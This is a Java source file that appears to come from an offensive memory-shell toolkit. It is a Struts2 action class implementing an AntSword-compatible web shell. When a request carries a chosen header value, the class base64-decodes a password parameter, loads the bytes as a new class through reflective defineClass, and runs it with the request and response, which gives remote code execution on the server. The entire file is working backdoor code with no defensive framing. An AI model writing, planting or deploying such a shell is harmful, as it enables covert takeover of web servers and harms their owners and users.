package com.reajason.javaweb.memshell.shelltool.antsword;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordStruct2Action {

    public static String pass;
    public static String headerName;
    public static String headerValue;

    public void execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context, "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = reflectionDefineClass(bytes).newInstance();
                instance.equals(new Object[]{request, response});
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }
}
